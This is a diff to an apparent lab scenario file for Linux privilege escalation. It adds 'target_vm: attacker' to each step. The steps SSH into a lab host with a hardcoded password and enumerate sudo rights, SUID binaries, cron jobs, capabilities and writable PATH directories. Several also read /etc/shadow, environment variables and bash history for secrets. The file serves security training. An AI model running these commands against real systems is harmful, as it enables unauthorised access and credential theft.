@@ -23,6 +23,7 @@ steps:
     type: output_contains
     expect: uid=
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'id && whoami && groups' 2>/dev/null
   risk_level: low
 - order: 2
@@ -36,6 +37,7 @@ steps:
     type: output_contains
     expect: sudo
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'echo 1 | sudo -S -l' 2>/dev/null
   risk_level: low
 - order: 3
@@ -49,6 +51,7 @@ steps:
     type: output_contains
     expect: /usr
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null | sort' 2>/dev/null
   risk_level: low
 - order: 4
@@ -62,6 +65,7 @@ steps:
     type: output_contains
     expect: /
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20' 2>/dev/null
   risk_level: low
 - order: 5
@@ -75,6 +79,7 @@ steps:
     type: output_contains
     expect: root
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'grep -E "/bin/(bash|sh|zsh)$" /etc/passwd' 2>/dev/null
   risk_level: low
 - order: 6
@@ -88,6 +93,7 @@ steps:
     type: output_contains
     expect: cron
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'cat /etc/crontab 2>/dev/null; echo ---; ls -la /etc/cron.d/ 2>/dev/null; echo ---; ls -la /var/spool/cron/crontabs/ 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 7
@@ -101,6 +107,7 @@ steps:
     type: output_contains
     expect: cap
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'getcap -r / 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 8
@@ -114,6 +121,7 @@ steps:
     type: output_contains
     expect: shadow
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'ls -la /etc/shadow; cat /etc/shadow 2>/dev/null || echo "Permission denied (normal)"' 2>/dev/null
   risk_level: low
 - order: 9
@@ -128,6 +136,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'env | grep -iE "(pass|key|secret|token|api)"' 2>/dev/null; echo '---'; sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80
     'cat /proc/1/environ 2>/dev/null | tr "\0" "\n" | grep -iE "(pass|key|secret)" || echo "Cannot read /proc/1/environ"' 2>/dev/null
   risk_level: low
@@ -142,6 +151,7 @@ steps:
     type: output_contains
     expect: ->
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'IFS=:; for d in $PATH; do echo -n "$d -> "; test -w "$d" && echo "WRITABLE" || echo "not writable"; done' 2>/dev/null
   risk_level: low
 - order: 11
@@ -155,6 +165,7 @@ steps:
     type: output_contains
     expect: docker
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>/dev/null || echo "Docker not accessible"' 2>/dev/null
   risk_level: low
 - order: 12
@@ -168,6 +179,7 @@ steps:
     type: output_contains
     expect: LISTEN
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'ss -tlnp 2>/dev/null' 2>/dev/null
   risk_level: low
 - order: 13
@@ -182,6 +194,7 @@ steps:
     type: output_contains
     expect: '---'
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'cat ~/.bash_history 2>/dev/null | grep -iE "(pass|key|secret|token|mysql|psql)" | head -10; echo ---; cat ~/.bash_history 2>/dev/null
     | tail -20' 2>/dev/null
   risk_level: low
@@ -197,6 +210,7 @@ steps:
     type: output_contains
     expect: Kernel
     field: stdout
+  target_vm: attacker
   script: sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 'echo "=== Kernel ==="; uname -a; echo "=== SUID ==="; find / -perm -4000 -type f 2>/dev/null | wc -l; echo "=== Sudo ==="; echo 1 |
     sudo -S -l 2>/dev/null | tail -5; echo "=== Cron ==="; ls /etc/cron.d/ 2>/dev/null; echo "=== Listening ==="; ss -tlnp 2>/dev/null | head -10' 2>/dev/null
   risk_level: low
@@ -213,6 +227,7 @@ steps:
     type: output_contains
     expect: Privilege Escalation Report
     field: stdout
+  target_vm: attacker
   script: 'echo -e ''=== Privilege Escalation Report ===\n\n[Vectors Found]\n1. sudo misconfig: 위험한 바이너리 NOPASSWD 허용\n2. SUID binaries: 비표준 SUID 파일 발견\n3. Writable cron scripts: root cronjob 조작 가능\n4. Capabilities:
     특수 capability 설정 확인\n5. PATH hijacking: writable PATH directory\n\n[Successful Techniques]\n- sudo -l 기반 권한 상승\n- SUID 바이너리 악용\n\n[Recommendations]\n1. sudo 규칙 최소화 (NOPASSWD 제거)\n2. 불필요한 SUID bit 제거\n3.
     cron 스크립트 권한 제한 (750)\n4. 정기적 권한 감사 수행\n5. SELinux/AppArmor 활성화'' > /tmp/privesc_report.txt && cat /tmp/privesc_report.txt'
